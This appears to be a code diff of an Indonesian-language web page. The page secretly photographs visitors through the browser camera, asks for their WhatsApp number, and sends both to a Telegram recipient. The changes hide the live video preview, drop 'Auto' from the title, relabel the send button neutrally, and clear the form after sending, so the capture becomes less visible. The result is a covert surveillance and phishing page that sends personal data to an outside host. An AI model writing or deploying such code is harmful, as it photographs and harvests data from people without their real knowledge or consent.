@@ -2,17 +2,17 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Ambil Foto & Kirim ke Telegram</title>
+  <title>Ambil Foto & Kirim ke Telegram</title>
 </head>
 <body>
   <h2 id="status">Memuat kamera...</h2>
-  <video id="video" width="300" autoplay playsinline></video>
+  <video id="video" width="300" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
   <div id="formContainer" style="display:none;">
     <h3>Masukkan Nomor WhatsApp</h3>
     <input type="text" id="waNumber" placeholder="Contoh: 6281234567890">
-    <button id="send">Kirim ke Telegram</button>
+    <button id="submitWa">Kirim Sekarang</button>
   </div>
 
   <script>
@@ -22,11 +22,13 @@
     const context = canvas.getContext('2d');
     let imageBlob = null;
 
+    // Akses kamera otomatis
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
+        // Tunggu video siap, lalu ambil foto setelah 2 detik
         video.onloadedmetadata = () => {
           status.textContent = "Mengambil foto...";
           setTimeout(() => {
@@ -36,21 +38,21 @@
               status.textContent = "Foto berhasil diambil!";
               document.getElementById('formContainer').style.display = 'block';
             }, 'image/jpeg');
-          }, 2000); // Tunggu 2 detik sebelum ambil foto
+          }, 2000);
         };
       } catch (err) {
-        status.textContent = "Gagal mengakses kamera. Pastikan kamu memberikan izin dan menggunakan HTTPS atau localhost.";
-        console.error("Kamera error:", err);
+        status.textContent = "Gagal mengakses kamera. Gunakan HTTPS atau localhost, dan izinkan kamera.";
+        console.error(err);
       }
     }
 
     startCamera();
 
-    // Kirim ke Telegram saat tombol ditekan
-    document.getElementById('send').addEventListener('click', () => {
+    // Kirim otomatis ke Telegram setelah masukkan nomor
+    document.getElementById('submitWa').addEventListener('click', () => {
       const waNumber = document.getElementById('waNumber').value.trim();
       if (!waNumber || !imageBlob) {
-        alert("Masukkan nomor WhatsApp dan pastikan foto berhasil diambil.");
+        alert("Isi nomor WhatsApp dan pastikan foto berhasil diambil.");
         return;
       }
 
@@ -63,13 +65,14 @@
         method: 'POST',
         body: formData
       })
-      .then(response => response.json())
+      .then(res => res.json())
       .then(data => {
-        alert("Foto dan nomor berhasil dikirim ke Telegram!");
+        alert("Foto & nomor berhasil dikirim ke Telegram!");
+        document.getElementById('formContainer').innerHTML = "<p>Data sudah terkirim.</p>";
       })
-      .catch(error => {
-        alert("Gagal mengirim ke Telegram: " + error);
-        console.error("Telegram error:", error);
+      .catch(err => {
+        alert("Gagal kirim ke Telegram: " + err);
+        console.error(err);
       });
     });
   </script>
